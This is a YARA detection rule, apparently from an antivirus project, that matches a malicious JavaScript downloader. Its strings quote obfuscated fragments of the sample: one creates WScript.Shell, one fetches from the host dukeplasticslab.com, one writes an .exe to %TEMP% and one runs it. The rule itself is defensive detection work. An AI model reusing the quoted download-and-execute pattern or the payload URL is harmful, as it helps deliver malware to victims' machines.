rule sig_20160328_99e9662c9f61450a64a46ef7377210a1 {
  meta:
    description = "datamaliciousorder - file 20160328_99e9662c9f61450a64a46ef7377210a1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1ee7ad5d25f6fb18a6f65d747414bae7485fbca19925a7a1f9100cadc9d0e383"

  strings:
    $s1  = "function Rrnbbjmnmz() {return Btgupwjbz[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"DTc8AQZX6INbv1.exe\";};" fullword ascii
    $s2  = "Mpliegsz[Dzzlcmydqq](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Baxqmm](Gnpcvluguc() * 11)} while (Mpliegsz[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Btgupwjbz = function Hewixsew() {return WScript[Lcdvqxo](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Jiqdgonwd(Dpjygrf, Shttzmghyu){return Dpjygrf - Shttzmghyu;};" fullword ascii
    $s6  = "function Ayerx(Lpblari){Btgupwjbz[\"Run\"](Lpblari, Qojia, Qojia);};" fullword ascii
    $s7  = "function Xdyvfv() {return ((Klwbbbk == true) && (Klwbbbk == Npfqakdmf)) ? 1 : Qojia;};" fullword ascii
    $s8  = "var Yqyrxq = false;" fullword ascii
    $s9  = "Klwbbbk = true; " fullword ascii
    $s10 = "return Jiqdgonwd(Izhmehuxr, Xvzltjy);" fullword ascii
    $s11 = "var Uodzq = new this[\"Date\"]();" fullword ascii
    $s12 = "function Gnpcvluguc(){return 22;};" fullword ascii
    $s13 = "var Npfqakdmf = false;" fullword ascii
    $s14 = "function Vkbvm(){return Ctnbiu;};" fullword ascii
    $s15 = " while (Vvpoyuulmi){" fullword ascii
    $s16 = "function Sofug()" fullword ascii
    $s17 = "Npfqakdmf = true; " fullword ascii
    $s18 = "function Sgwbc(Unycf) {var Mnfmektns = (1, 2, 3, 4, 5, Unycf); return Mnfmektns;};" fullword ascii
    $s19 = "function Arsylyd(){return Lcdvqxo;};" fullword ascii
    $s20 = "var Klwbbbk = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}